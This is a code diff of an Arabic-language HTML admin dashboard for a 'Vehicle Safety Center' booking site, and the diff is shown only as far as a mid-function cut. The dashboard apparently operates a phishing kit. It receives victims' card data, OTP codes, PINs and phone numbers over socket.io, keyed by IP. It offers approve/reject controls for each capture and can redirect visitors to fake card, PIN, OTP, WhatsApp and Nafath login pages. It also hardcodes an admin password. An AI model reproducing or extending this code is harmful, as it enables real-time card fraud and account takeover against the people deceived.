@@ -1,176 +1,337 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-<meta charset="UTF-8"/>
-<meta name="viewport" content="width=device-width,initial-scale=1.0"/>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>مركز سلامة المركبات | لوحة التحكم</title>
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"/>
+<script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
 <style>
-*{margin:0;padding:0;box-sizing:border-box}
-body{font-family:'Segoe UI',Tahoma,sans-serif;background:#f0f4f8;color:#1a1a2e;direction:rtl}
-/* LOGIN */
-#loginPage{min-height:100vh;display:flex;align-items:center;justify-content:center;background:linear-gradient(135deg,#1a2744,#0f1f3d)}
-.lcard{background:#fff;border-radius:20px;padding:40px 36px;width:360px;box-shadow:0 20px 60px rgba(0,0,0,.3);text-align:center}
-.llogo{width:60px;height:60px;background:#1a6b4a;border-radius:16px;display:flex;align-items:center;justify-content:center;margin:0 auto 16px}
-.llogo i{color:#fff;font-size:28px}
-.lcard h2{font-size:20px;font-weight:700;margin-bottom:4px}
-.lcard p{font-size:13px;color:#6b7280;margin-bottom:28px}
-.ig{text-align:right;margin-bottom:16px;position:relative}
-.ig label{display:block;font-size:13px;color:#374151;margin-bottom:6px;font-weight:500}
-.ig input{width:100%;border:1.5px solid #d1d5db;border-radius:12px;padding:12px 16px;font-size:14px;outline:none;transition:border-color .2s}
-.ig input:focus{border-color:#1a6b4a;box-shadow:0 0 0 3px rgba(26,107,74,.1)}
-.tpw{position:absolute;left:12px;top:38px;background:none;border:none;cursor:pointer;color:#9ca3af}
-.errmsg{background:#fef2f2;color:#dc2626;border-radius:8px;padding:10px 14px;font-size:13px;margin-bottom:14px;display:none}
-.btnl{width:100%;background:#1a6b4a;color:#fff;border:none;border-radius:12px;padding:13px;font-size:15px;font-weight:600;cursor:pointer}
-.btnl:hover{background:#155a3d}
-/* ADMIN */
-#adminPanel{display:none;min-height:100vh}
-.topbar{background:#fff;border-bottom:1px solid #e5e7eb;padding:0 24px;height:56px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:100;box-shadow:0 1px 4px rgba(0,0,0,.06)}
-.brand{display:flex;align-items:center;gap:10px}
-.bicon{width:36px;height:36px;background:#1a6b4a;border-radius:10px;display:flex;align-items:center;justify-content:center}
-.bicon i{color:#fff;font-size:16px}
-.bname{font-size:15px;font-weight:700}
-.bsub{font-size:11px;color:#6b7280}
-.sdot{width:8px;height:8px;border-radius:50%;background:#ef4444;display:inline-block;margin-left:6px}
-.stext{font-size:12px;color:#6b7280}
-.btnout{background:#ef4444;color:#fff;border:none;border-radius:8px;padding:7px 14px;font-size:13px;cursor:pointer;display:flex;align-items:center;gap:6px}
-.btnout:hover{background:#dc2626}
-.main{padding:24px;max-width:1500px;margin:0 auto}
-/* STATS */
-.stats{display:grid;grid-template-columns:repeat(5,1fr);gap:16px;margin-bottom:24px}
-.sc{background:#fff;border-radius:14px;padding:18px 20px;display:flex;align-items:center;justify-content:space-between;box-shadow:0 1px 4px rgba(0,0,0,.06);border:1px solid #f3f4f6}
-.sv{font-size:26px;font-weight:700}
-.sl{font-size:12px;color:#6b7280;margin-top:2px}
-.si{width:44px;height:44px;border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:20px}
-.si.g{background:#dcfce7;color:#16a34a}.si.b{background:#dbeafe;color:#2563eb}
-.si.o{background:#ffedd5;color:#ea580c}.si.p{background:#ede9fe;color:#7c3aed}
-.si.t{background:#ccfbf1;color:#0d9488}
-/* BOOKINGS */
-.tcard{background:#fff;border-radius:14px;overflow:hidden;box-shadow:0 1px 4px rgba(0,0,0,.06);border:1px solid #f3f4f6}
-.thead2{padding:14px 20px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid #f3f4f6}
-.ttitle{font-size:15px;font-weight:700}
-.sbar{background:#fff;border-radius:10px;padding:10px 14px;margin-bottom:14px;display:flex;align-items:center;gap:10px;border:1px solid #e5e7eb}
-.sbar i{color:#9ca3af}
-.sbar input{border:none;outline:none;font-size:13px;color:#374151;flex:1;background:transparent}
-.btnref{background:#f3f4f6;color:#374151;border:none;border-radius:8px;padding:7px 12px;font-size:12px;cursor:pointer;display:flex;align-items:center;gap:5px}
-.btnref:hover{background:#e5e7eb}
-table{width:100%;border-collapse:collapse}
-thead{background:#f9fafb}
-th{padding:11px 14px;text-align:right;font-size:11px;font-weight:600;color:#6b7280;border-bottom:1px solid #f3f4f6;white-space:nowrap}
-td{padding:12px 14px;font-size:12px;color:#374151;border-bottom:1px solid #f9fafb;white-space:nowrap}
-tr:last-child td{border-bottom:none}
-tr:hover td{background:#fafafa}
-.badge{display:inline-flex;align-items:center;padding:3px 9px;border-radius:20px;font-size:11px;font-weight:600}
-.bp{background:#fef3c7;color:#d97706}.bc{background:#dcfce7;color:#16a34a}
-.br{background:#fee2e2;color:#dc2626}.bn{background:#dbeafe;color:#2563eb}
-.abts{display:flex;gap:5px;align-items:center}
-/* زر التفاصيل */
-.bdet{background:#2563eb;color:#fff;border:none;border-radius:7px;padding:5px 10px;font-size:11px;cursor:pointer;display:flex;align-items:center;gap:3px}
-.bdet:hover{background:#1d4ed8}
-/* زر إعادة التوجيه */
-.bnav{background:#7c3aed;color:#fff;border:none;border-radius:7px;padding:5px 10px;font-size:11px;cursor:pointer;display:flex;align-items:center;gap:3px;position:relative}
-.bnav:hover{background:#6d28d9}
-/* قائمة التوجيه المنسدلة */
-.navdrop{position:absolute;top:100%;right:0;background:#fff;border:1px solid #e5e7eb;border-radius:10px;box-shadow:0 8px 24px rgba(0,0,0,.12);z-index:200;min-width:160px;padding:6px;display:none;margin-top:4px}
-.navdrop.open{display:block}
-.navdrop a{display:block;padding:8px 12px;font-size:12px;color:#374151;border-radius:7px;cursor:pointer;text-decoration:none}
-.navdrop a:hover{background:#f3f4f6;color:#1a6b4a}
-.empty{text-align:center;padding:50px 20px;color:#9ca3af}
-.empty i{font-size:36px;margin-bottom:10px;display:block}
-/* MODAL */
-.moverlay{position:fixed;inset:0;background:rgba(0,0,0,.5);display:none;align-items:center;justify-content:center;z-index:1000}
-.moverlay.active{display:flex}
-.modal{background:#fff;border-radius:16px;padding:28px;width:500px;max-width:95vw;max-height:90vh;overflow-y:auto;box-shadow:0 20px 60px rgba(0,0,0,.2)}
-.mhdr{display:flex;align-items:center;justify-content:space-between;margin-bottom:20px;padding-bottom:16px;border-bottom:1px solid #f3f4f6}
-.mtitle{font-size:17px;font-weight:700}
-.mclose{background:#f3f4f6;border:none;border-radius:8px;width:32px;height:32px;cursor:pointer;font-size:16px;color:#6b7280}
-.mclose:hover{background:#e5e7eb}
-.drow{display:flex;justify-content:space-between;align-items:center;padding:10px 0;border-bottom:1px solid #f9fafb}
-.drow:last-child{border-bottom:none}
-.dlbl{font-size:13px;color:#6b7280}.dval{font-size:13px;color:#1f2937;font-weight:500}
-/* البيانات الإضافية داخل المودال */
-.dsection{background:#f9fafb;border-radius:10px;padding:14px;margin-top:14px;border:1px solid #f3f4f6}
-.dsection-title{font-size:13px;font-weight:700;color:#374151;margin-bottom:10px;display:flex;align-items:center;gap:6px}
-.macts{display:flex;gap:10px;margin-top:20px}
-.macts button{flex:1;padding:11px;border:none;border-radius:10px;font-size:14px;font-weight:600;cursor:pointer}
-.macc{background:#16a34a;color:#fff}.macc:hover{background:#15803d}
-.mrej2{background:#dc2626;color:#fff}.mrej2:hover{background:#b91c1c}
-/* TOAST */
-.toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%);background:#1f2937;color:#fff;padding:12px 24px;border-radius:10px;font-size:14px;z-index:9999;display:none;align-items:center;gap:8px;box-shadow:0 4px 20px rgba(0,0,0,.2)}
-.toast.show{display:flex}.toast.success{background:#16a34a}.toast.error{background:#dc2626}.toast.info{background:#2563eb}
-/* نقطة جديدة */
-.newdot{width:8px;height:8px;border-radius:50%;background:#ef4444;display:inline-block;margin-right:4px;animation:pulse 1s infinite}
-@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
-@media(max-width:1024px){.stats{grid-template-columns:repeat(3,1fr)}}
-@media(max-width:600px){.stats{grid-template-columns:repeat(2,1fr)}.main{padding:12px}}
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #f0f4f8; direction: rtl; }
+
+  /* Login */
+  #loginPage {
+    min-height: 100vh; display: flex; align-items: center; justify-content: center;
+    background: linear-gradient(135deg, #1a5c38 0%, #2d8a57 100%);
+  }
+  .login-box {
+    background: #fff; border-radius: 16px; padding: 40px; width: 360px;
+    box-shadow: 0 20px 60px rgba(0,0,0,0.2);
+  }
+  .login-box h2 { text-align: center; color: #1a5c38; margin-bottom: 8px; font-size: 20px; }
+  .login-box p { text-align: center; color: #666; font-size: 13px; margin-bottom: 24px; }
+  .login-box input {
+    width: 100%; padding: 12px 16px; border: 1.5px solid #ddd; border-radius: 10px;
+    font-size: 14px; margin-bottom: 16px; direction: ltr; text-align: center;
+    transition: border-color 0.2s;
+  }
+  .login-box input:focus { outline: none; border-color: #1a5c38; }
+  .login-box button {
+    width: 100%; padding: 13px; background: #1a5c38; color: #fff; border: none;
+    border-radius: 10px; font-size: 15px; font-weight: 600; cursor: pointer;
+    transition: background 0.2s;
+  }
+  .login-box button:hover { background: #145030; }
+  .login-error { color: #e53e3e; font-size: 13px; text-align: center; margin-top: -8px; margin-bottom: 12px; }
+
+  /* Navbar */
+  #adminPage { display: none; }
+  .navbar {
+    background: #fff; padding: 0 24px; height: 60px; display: flex; align-items: center;
+    justify-content: space-between; box-shadow: 0 2px 8px rgba(0,0,0,0.08); position: sticky; top: 0; z-index: 100;
+  }
+  .navbar-brand { display: flex; align-items: center; gap: 10px; }
+  .navbar-brand span { font-size: 16px; font-weight: 700; color: #1a5c38; }
+  .navbar-status { display: flex; align-items: center; gap: 8px; font-size: 13px; color: #555; }
+  .status-dot { width: 9px; height: 9px; border-radius: 50%; background: #48bb78; animation: pulse 2s infinite; }
+  .status-dot.offline { background: #fc8181; animation: none; }
+  @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.4} }
+  .btn-logout {
+    background: #fee2e2; color: #e53e3e; border: none; padding: 7px 16px;
+    border-radius: 8px; font-size: 13px; cursor: pointer; font-weight: 600;
+  }
+
+  /* Stats */
+  .stats-row { display: flex; gap: 16px; padding: 20px 24px 0; flex-wrap: wrap; }
+  .stat-card {
+    background: #fff; border-radius: 14px; padding: 18px 22px; flex: 1; min-width: 150px;
+    box-shadow: 0 2px 8px rgba(0,0,0,0.06); display: flex; align-items: center; gap: 14px;
+  }
+  .stat-icon {
+    width: 46px; height: 46px; border-radius: 12px; display: flex; align-items: center;
+    justify-content: center; font-size: 20px; flex-shrink: 0;
+  }
+  .stat-icon.green { background: #d1fae5; color: #059669; }
+  .stat-icon.blue { background: #dbeafe; color: #2563eb; }
+  .stat-icon.orange { background: #ffedd5; color: #ea580c; }
+  .stat-icon.purple { background: #ede9fe; color: #7c3aed; }
+  .stat-icon.teal { background: #ccfbf1; color: #0d9488; }
+  .stat-info { flex: 1; }
+  .stat-num { font-size: 26px; font-weight: 800; color: #1a202c; line-height: 1; }
+  .stat-label { font-size: 12px; color: #718096; margin-top: 4px; }
+
+  /* Main content */
+  .main-content { padding: 20px 24px; }
+
+  /* Pending requests section */
+  .section-title {
+    font-size: 16px; font-weight: 700; color: #1a202c; margin-bottom: 14px;
+    display: flex; align-items: center; gap: 8px;
+  }
+  .badge-count {
+    background: #e53e3e; color: #fff; border-radius: 50%; width: 22px; height: 22px;
+    display: inline-flex; align-items: center; justify-content: center; font-size: 11px; font-weight: 700;
+  }
+
+  /* Pending cards */
+  .pending-grid { display: flex; flex-direction: column; gap: 12px; margin-bottom: 24px; }
+  .pending-card {
+    background: #fff; border-radius: 14px; padding: 18px 20px;
+    box-shadow: 0 2px 8px rgba(0,0,0,0.07); border-right: 4px solid #2563eb;
+    animation: slideIn 0.3s ease;
+  }
+  .pending-card.payment-card { border-right-color: #7c3aed; }
+  .pending-card.otp-card { border-right-color: #ea580c; }
+  .pending-card.pin-card { border-right-color: #0d9488; }
+  @keyframes slideIn { from{opacity:0;transform:translateY(-10px)} to{opacity:1;transform:translateY(0)} }
+  .pending-card-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 14px; }
+  .pending-type {
+    display: flex; align-items: center; gap: 8px; font-weight: 700; font-size: 14px;
+  }
+  .type-badge {
+    padding: 3px 10px; border-radius: 20px; font-size: 11px; font-weight: 700;
+  }
+  .type-badge.payment { background: #ede9fe; color: #7c3aed; }
+  .type-badge.otp { background: #ffedd5; color: #ea580c; }
+  .type-badge.pin { background: #ccfbf1; color: #0d9488; }
+  .pending-ip { font-size: 12px; color: #718096; direction: ltr; }
+  .pending-data { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; margin-bottom: 16px; }
+  .data-field { background: #f8fafc; border-radius: 8px; padding: 10px 12px; }
+  .data-field label { font-size: 11px; color: #718096; display: block; margin-bottom: 3px; }
+  .data-field span { font-size: 14px; font-weight: 600; color: #1a202c; direction: ltr; display: block; }
+  .data-field.full { grid-column: 1 / -1; }
+  .pending-actions { display: flex; gap: 10px; }
+  .btn-approve {
+    flex: 1; padding: 11px; background: #059669; color: #fff; border: none;
+    border-radius: 10px; font-size: 14px; font-weight: 700; cursor: pointer;
+    transition: background 0.2s; display: flex; align-items: center; justify-content: center; gap: 6px;
+  }
+  .btn-approve:hover { background: #047857; }
+  .btn-reject {
+    flex: 1; padding: 11px; background: #e53e3e; color: #fff; border: none;
+    border-radius: 10px; font-size: 14px; font-weight: 700; cursor: pointer;
+    transition: background 0.2s; display: flex; align-items: center; justify-content: center; gap: 6px;
+  }
+  .btn-reject:hover { background: #c53030; }
+
+  /* Bookings table */
+  .table-card {
+    background: #fff; border-radius: 14px; box-shadow: 0 2px 8px rgba(0,0,0,0.06); overflow: hidden;
+  }
+  .table-header {
+    padding: 16px 20px; display: flex; align-items: center; justify-content: space-between;
+    border-bottom: 1px solid #f0f4f8;
+  }
+  .search-box {
+    display: flex; align-items: center; gap: 8px; background: #f8fafc;
+    border: 1.5px solid #e2e8f0; border-radius: 10px; padding: 8px 14px; width: 240px;
+  }
+  .search-box input { border: none; background: transparent; font-size: 13px; outline: none; width: 100%; }
+  .btn-refresh {
+    background: #f0f4f8; border: none; padding: 8px 14px; border-radius: 8px;
+    font-size: 13px; cursor: pointer; display: flex; align-items: center; gap: 6px; color: #4a5568;
+  }
+  table { width: 100%; border-collapse: collapse; }
+  th { background: #f8fafc; padding: 12px 16px; font-size: 12px; color: #718096; font-weight: 600; text-align: right; }
+  td { padding: 13px 16px; font-size: 13px; color: #2d3748; border-bottom: 1px solid #f0f4f8; }
+  tr:last-child td { border-bottom: none; }
+  tr:hover td { background: #fafbfc; }
+  .status-badge {
+    padding: 3px 10px; border-radius: 20px; font-size: 11px; font-weight: 700; display: inline-block;
+  }
+  .status-new { background: #dbeafe; color: #2563eb; }
+  .status-approved { background: #d1fae5; color: #059669; }
+  .status-rejected { background: #fee2e2; color: #e53e3e; }
+  .status-pending { background: #ffedd5; color: #ea580c; }
+  .btn-details {
+    background: #2563eb; color: #fff; border: none; padding: 6px 14px;
+    border-radius: 8px; font-size: 12px; cursor: pointer; font-weight: 600;
+  }
+  .btn-nav {
+    background: #f0f4f8; color: #4a5568; border: none; padding: 6px 10px;
+    border-radius: 8px; font-size: 12px; cursor: pointer; position: relative;
+  }
+  .nav-dropdown {
+    display: none; position: absolute; top: 100%; left: 0; background: #fff;
+    border-radius: 10px; box-shadow: 0 8px 24px rgba(0,0,0,0.15); z-index: 200;
+    min-width: 180px; padding: 8px 0; margin-top: 4px;
+  }
+  .nav-dropdown.show { display: block; }
+  .nav-dropdown a {
+    display: block; padding: 9px 16px; font-size: 13px; color: #2d3748;
+    text-decoration: none; cursor: pointer;
+  }
+  .nav-dropdown a:hover { background: #f0f4f8; color: #1a5c38; }
+
+  /* Modal */
+  .modal-overlay {
+    display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.5);
+    z-index: 1000; align-items: center; justify-content: center;
+  }
+  .modal-overlay.show { display: flex; }
+  .modal {
+    background: #fff; border-radius: 16px; width: 520px; max-width: 95vw;
+    max-height: 90vh; overflow-y: auto; box-shadow: 0 20px 60px rgba(0,0,0,0.2);
+  }
+  .modal-header {
+    padding: 20px 24px; border-bottom: 1px solid #f0f4f8;
+    display: flex; align-items: center; justify-content: space-between;
+  }
+  .modal-header h3 { font-size: 16px; font-weight: 700; color: #1a202c; }
+  .modal-close { background: none; border: none; font-size: 20px; cursor: pointer; color: #718096; }
+  .modal-body { padding: 20px 24px; }
+  .modal-section { margin-bottom: 20px; }
+  .modal-section h4 { font-size: 13px; font-weight: 700; color: #718096; margin-bottom: 10px; text-transform: uppercase; letter-spacing: 0.5px; }
+  .modal-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+  .modal-field { background: #f8fafc; border-radius: 8px; padding: 10px 12px; }
+  .modal-field label { font-size: 11px; color: #718096; display: block; margin-bottom: 3px; }
+  .modal-field span { font-size: 14px; font-weight: 600; color: #1a202c; direction: ltr; display: block; }
+  .modal-field.full { grid-column: 1 / -1; }
+  .modal-footer { padding: 16px 24px; border-top: 1px solid #f0f4f8; display: flex; gap: 10px; }
+  .btn-modal-approve {
+    flex: 1; padding: 12px; background: #059669; color: #fff; border: none;
+    border-radius: 10px; font-size: 14px; font-weight: 700; cursor: pointer;
+  }
+  .btn-modal-reject {
+    flex: 1; padding: 12px; background: #e53e3e; color: #fff; border: none;
+    border-radius: 10px; font-size: 14px; font-weight: 700; cursor: pointer;
+  }
+
+  .empty-state { text-align: center; padding: 40px; color: #a0aec0; }
+  .empty-state i { font-size: 40px; margin-bottom: 12px; display: block; }
+
+  @media(max-width:768px) {
+    .stats-row { padding: 16px; }
+    .main-content { padding: 16px; }
+    .pending-data { grid-template-columns: 1fr; }
+    .modal-grid { grid-template-columns: 1fr; }
+  }
 </style>
 </head>
 <body>
 
-<!-- LOGIN -->
+<!-- Login Page -->
 <div id="loginPage">
-  <div class="lcard">
-    <div class="llogo"><i class="fas fa-car"></i></div>
-    <h2>مركز سلامة المركبات</h2>
+  <div class="login-box">
+    <h2><i class="fas fa-shield-alt" style="color:#1a5c38;margin-left:8px"></i> مركز سلامة المركبات</h2>
     <p>لوحة التحكم الإدارية</p>
-    <form id="loginForm">
-      <div class="ig">
-        <label>كلمة المرور</label>
-        <input type="password" id="pwInput" placeholder="أدخل كلمة المرور"/>
-        <button type="button" class="tpw" onclick="togglePw()"><i class="fas fa-eye" id="eyeIcon"></i></button>
-      </div>
-      <div class="errmsg" id="loginErr">كلمة المرور غير صحيحة</div>
-      <button type="submit" class="btnl"><i class="fas fa-sign-in-alt"></i> تسجيل الدخول</button>
-    </form>
+    <input type="password" id="pwInput" placeholder="كلمة المرور" onkeydown="if(event.key==='Enter')doLogin()">
+    <div id="loginError" class="login-error" style="display:none">كلمة المرور غير صحيحة</div>
+    <button onclick="doLogin()"><i class="fas fa-sign-in-alt"></i> دخول</button>
   </div>
 </div>
 
-<!-- ADMIN PANEL -->
-<div id="adminPanel">
-  <div class="topbar">
-    <div class="brand">
-      <div class="bicon"><i class="fas fa-car"></i></div>
-      <div><div class="bname">مركز سلامة المركبات</div><div class="bsub">لوحة التحكم الإدارية</div></div>
+<!-- Admin Page -->
+<div id="adminPage">
+  <!-- Navbar -->
+  <div class="navbar">
+    <div class="navbar-brand">
+      <i class="fas fa-shield-alt" style="color:#1a5c38;font-size:22px"></i>
+      <span>مركز سلامة المركبات</span>
     </div>
-    <div style="display:flex;align-items:center;gap:16px">
-      <span><span class="sdot" id="sdot"></span><span class="stext" id="stext">جاري الاتصال...</span></span>
-      <button class="btnout" onclick="logout()"><i class="fas fa-sign-out-alt"></i> خروج</button>
+    <div class="navbar-status">
+      <div class="status-dot offline" id="statusDot"></div>
+      <span id="statusText">غير متصل</span>
+    </div>
+    <button class="btn-logout" onclick="doLogout()"><i class="fas fa-sign-out-alt"></i> خروج</button>
+  </div>
+
+  <!-- Stats -->
+  <div class="stats-row">
+    <div class="stat-card">
+      <div class="stat-icon green"><i class="fas fa-wifi"></i></div>
+      <div class="stat-info">
+        <div class="stat-num" id="statVisitors">0</div>
+        <div class="stat-label">زوار متصلون الآن</div>
+      </div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-icon orange"><i class="fas fa-clock"></i></div>
+      <div class="stat-info">
+        <div class="stat-num" id="statPending">0</div>
+        <div class="stat-label">قيد المعالجة</div>
+      </div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-icon blue"><i class="fas fa-check-circle"></i></div>
+      <div class="stat-info">
+        <div class="stat-num" id="statCompleted">0</div>
+        <div class="stat-label">مكتملة</div>
+      </div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-icon purple"><i class="fas fa-bell"></i></div>
+      <div class="stat-info">
+        <div class="stat-num" id="statToday">0</div>
+        <div class="stat-label">حجوزات جديدة</div>
+      </div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-icon teal"><i class="fas fa-users"></i></div>
+      <div class="stat-info">
+        <div class="stat-num" id="statTotal">0</div>
+        <div class="stat-label">إجمالي الحجوزات</div>
+      </div>
     </div>
   </div>
-  <div class="main">
-    <!-- STATS: زوار على اليسار، إجمالي على اليمين -->
-    <div class="stats">
-      <div class="sc"><div><div class="sv" id="s1">0</div><div class="sl">زوار متصلون الآن</div></div><div class="si g"><i class="fas fa-wifi"></i></div></div>
-      <div class="sc"><div><div class="sv" id="s2">0</div><div class="sl">قيد المعالجة</div></div><div class="si o"><i class="fas fa-clock"></i></div></div>
-      <div class="sc"><div><div class="sv" id="s3">0</div><div class="sl">مكتملة</div></div><div class="si b"><i class="fas fa-check-circle"></i></div></div>
-      <div class="sc"><div><div class="sv" id="s4">0</div><div class="sl">حجوزات اليوم</div></div><div class="si p"><i class="fas fa-bell"></i></div></div>
-      <div class="sc"><div><div class="sv" id="s5">0</div><div class="sl">إجمالي الحجوزات</div></div><div class="si t"><i class="fas fa-users"></i></div></div>
+
+  <!-- Main Content -->
+  <div class="main-content">
+
+    <!-- Pending Requests -->
+    <div id="pendingSection" style="display:none; margin-bottom:24px">
+      <div class="section-title">
+        <i class="fas fa-exclamation-circle" style="color:#ea580c"></i>
+        طلبات تنتظر الموافقة
+        <span class="badge-count" id="pendingCount">0</span>
+      </div>
+      <div class="pending-grid" id="pendingGrid"></div>
     </div>
 
-    <!-- BOOKINGS TABLE (عرض كامل) -->
-    <div class="sbar"><i class="fas fa-search"></i><input type="text" id="srch" placeholder="بحث بالاسم أو الهاتف أو المنطقة..." oninput="filterTable()"/></div>
-    <div class="tcard">
-      <div class="thead2">
-        <span class="ttitle"><i class="fas fa-calendar-check" style="color:#1a6b4a;margin-left:8px"></i>قائمة الحجوزات</span>
-        <button class="btnref" onclick="loadBookings()"><i class="fas fa-sync-alt"></i> تحديث</button>
+    <!-- Bookings Table -->
+    <div class="table-card">
+      <div class="table-header">
+        <div class="section-title" style="margin-bottom:0">
+          <i class="fas fa-list" style="color:#1a5c38"></i>
+          قائمة الحجوزات
+        </div>
+        <div style="display:flex;gap:10px;align-items:center">
+          <div class="search-box">
+            <i class="fas fa-search" style="color:#a0aec0;font-size:13px"></i>
+            <input type="text" id="searchInput" placeholder="بحث..." oninput="filterTable()">
+          </div>
+          <button class="btn-refresh" onclick="loadBookings()">
+            <i class="fas fa-sync-alt"></i> تحديث
+          </button>
+        </div>
       </div>
       <div style="overflow-x:auto">
-        <table>
+        <table id="bookingsTable">
           <thead>
             <tr>
-              <th>#</th>
               <th>الاسم</th>
-              <th>رقم الهاتف</th>
+              <th>الهوية</th>
+              <th>الهاتف</th>
               <th>المنطقة</th>
               <th>نوع الخدمة</th>
               <th>التاريخ</th>
-              <th>الوقت</th>
               <th>الحالة</th>
               <th>الإجراءات</th>
             </tr>
           </thead>
-          <tbody id="btable">
-            <tr><td colspan="9"><div class="empty"><i class="fas fa-inbox"></i><p>جاري التحميل...</p></div></td></tr>
+          <tbody id="bookingsBody">
+            <tr><td colspan="8" class="empty-state"><i class="fas fa-inbox"></i>لا توجد حجوزات بعد</td></tr>
           </tbody>
         </table>
       </div>
@@ -178,325 +339,487 @@ tr:hover td{background:#fafafa}
   </div>
 </div>
 
-<!-- MODAL التفاصيل -->
-<div class="moverlay" id="moverlay" onclick="closeMO(event)">
+<!-- Details Modal -->
+<div class="modal-overlay" id="detailsModal">
   <div class="modal">
-    <div class="mhdr">
-      <span class="mtitle"><i class="fas fa-info-circle" style="color:#1a6b4a;margin-left:8px"></i>تفاصيل الحجز</span>
-      <button class="mclose" onclick="closeM()">&#10005;</button>
+    <div class="modal-header">
+      <h3><i class="fas fa-user-circle" style="color:#1a5c38;margin-left:8px"></i> تفاصيل الحجز</h3>
+      <button class="modal-close" onclick="closeModal()">&times;</button>
     </div>
-    <div id="mbody"></div>
-    <div class="macts" id="macts"></div>
+    <div class="modal-body" id="modalBody"></div>
+    <div class="modal-footer" id="modalFooter"></div>
   </div>
 </div>
 
-<div class="toast" id="toast"></div>
-
-<script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
 <script>
-const SRV = 'https://vsafety-server-production.up.railway.app';
-const PASS = 'Vsafety@2024';
-const PAGES = [
-  {v:'home',l:'الرئيسية'},
-  {v:'booking',l:'حجز موعد'},
-  {v:'payments',l:'بيانات البطاقة'},
-  {v:'phone',l:'رقم الهاتف'},
-  {v:'pin',l:'رمز PIN'},
-  {v:'code',l:'كود OTP'},
-  {v:'whats',l:'واتساب'},
-  {v:'nafad',l:'نفاذ'},
-  {v:'waiting',l:'صفحة الانتظار'},
-  {v:'success',l:'نجاح'}
-];
+const SERVER_URL = 'https://vsafety-server-production.up.railway.app';
+const ADMIN_PASSWORD = 'Vsafety@2024';
 
-let socket = null, bookings = [], visitors = [];
-// تخزين البيانات الإضافية لكل حجز (بطاقة، OTP، هاتف...)
-let sessionData = {};
+let socket = null;
+let allBookings = [];
+let currentModalBooking = null;
+let pendingRequests = {};
 
-// إغلاق كل القوائم المنسدلة عند النقر خارجها
-document.addEventListener('click', function(e) {
-  if (!e.target.closest('.bnav')) {
-    document.querySelectorAll('.navdrop.open').forEach(function(d){ d.classList.remove('open'); });
-  }
-});
-
-// LOGIN
-document.getElementById('loginForm').addEventListener('submit', function(e) {
-  e.preventDefault();
-  if (document.getElementById('pwInput').value === PASS) {
-    localStorage.setItem('aa', '1');
-    showAdmin();
+// ==================== Login ====================
+function doLogin() {
+  const pw = document.getElementById('pwInput').value;
+  if (pw === ADMIN_PASSWORD) {
+    document.getElementById('loginPage').style.display = 'none';
+    document.getElementById('adminPage').style.display = 'block';
+    initSocket();
+    loadBookings();
   } else {
-    var el = document.getElementById('loginErr');
-    el.style.display = 'block';
-    setTimeout(function(){ el.style.display = 'none'; }, 3000);
+    document.getElementById('loginError').style.display = 'block';
   }
-});
-
-function togglePw() {
-  var i = document.getElementById('pwInput'), ic = document.getElementById('eyeIcon');
-  i.type = i.type === 'password' ? 'text' : 'password';
-  ic.className = i.type === 'text' ? 'fas fa-eye-slash' : 'fas fa-eye';
 }
 
-function logout() {
-  localStorage.removeItem('aa');
+function doLogout() {
   if (socket) socket.disconnect();
-  document.getElementById('adminPanel').style.display = 'none';
+  document.getElementById('adminPage').style.display = 'none';
   document.getElementById('loginPage').style.display = 'flex';
+  document.getElementById('pwInput').value = '';
 }
 
-function showAdmin() {
-  document.getElementById('loginPage').style.display = 'none';
-  document.getElementById('adminPanel').style.display = 'block';
-  initSocket();
-  loadBookings();
-}
-
-window.onload = function() { if (localStorage.getItem('aa') === '1') showAdmin(); };
-
+// ==================== Socket ====================
 function initSocket() {
-  socket = io(SRV, { transports: ['websocket', 'polling'] });
+  socket = io(SERVER_URL, { transports: ['websocket', 'polling'] });
 
-  socket.on('connect', function() {
-    document.getElementById('sdot').style.background = '#22c55e';
-    document.getElementById('stext').textContent = 'متصل';
+  socket.on('connect', () => {
     socket.emit('adminJoin');
+    document.getElementById('statusDot').className = 'status-dot';
+    document.getElementById('statusText').textContent = 'متصل';
   });
 
-  socket.on('disconnect', function() {
-    document.getElementById('sdot').style.background = '#ef4444';
-    document.getElementById('stext').textContent = 'منقطع';
+  socket.on('disconnect', () => {
+    document.getElementById('statusDot').className = 'status-dot offline';
+    document.getElementById('statusText').textContent = 'غير متصل';
   });
 
-  // تحديث عداد الزوار
-  socket.on('visitorUpdate', function(list) {
-    visitors = list || [];
-    document.getElementById('s1').textContent = visitors.length;
+  socket.on('visitorUpdate', (visitors) => {
+    document.getElementById('statVisitors').textContent = visitors.length;
   });
 
-  // حجز جديد
-  socket.on('newBooking', function(b) {
-    bookings.unshift(b);
-    renderBookings(bookings);
-    updateStats();
-    showToast('حجز جديد: ' + (b.name || 'عميل'), 'success');
-  });
-
-  // تحديث حجز
-  socket.on('bookingUpdated', function(b) {
-    var i = bookings.findIndex(function(x){ return x.id === b.id; });
-    if (i >= 0) bookings[i] = b;
-    renderBookings(bookings);
+  socket.on('newBooking', (booking) => {
+    allBookings.unshift(booking);
+    renderBookings();
     updateStats();
   });
 
-  // بيانات جديدة (بطاقة، OTP، هاتف...) - تُخزَّن وتُعرض في التفاصيل
-  socket.on('newData', function(d) {
-    var key = d.ip || d.socketId || 'unknown';
-    if (!sessionData[key]) sessionData[key] = [];
-    sessionData[key].unshift(d);
